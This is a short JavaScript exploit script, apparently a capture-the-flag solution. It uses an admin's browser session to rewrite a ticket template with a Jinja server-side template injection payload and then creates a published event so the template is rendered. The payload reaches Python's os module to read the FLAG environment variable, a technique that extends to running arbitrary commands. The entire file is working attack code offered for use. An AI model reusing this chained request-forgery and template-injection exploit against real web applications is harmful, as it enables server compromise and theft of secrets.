console.log("Started xploit")
let x = fetch("/admin/templates/1/edit", {
  "body": "name=Default+Ticket+Template&html_content=%3Ch1%3E%7B%7B+request.application.__globals__.__builtins__.__import__%28%27os%27%29.environ.get%28%27FLAG%27%29+%7D%7D%3C%2Fh1%3E%3Cp%3E%7B%7B+buyer_name+%7D%7D%3C%2Fp%3E%3Cp%3E%7B%7B+ticket_code+%7D%7D%3C%2Fp%3E&is_default=on",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
fetch("/admin/events/create", {
  "body": "------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nTest\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"date\"\r\n\r\n2026-04-16\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"time\"\r\n\r\n00:00\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\nYipeee\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"location\"\r\n\r\nPrague\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"ticket_price\"\r\n\r\n1\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"total_tickets\"\r\n\r\n100\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"image\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"template_id\"\r\n\r\n1\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR\r\nContent-Disposition: form-data; name=\"is_published\"\r\n\r\non\r\n------WebKitFormBoundaryHSnDc4sF3dsdeouR--\r\n",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
console.log("Done")
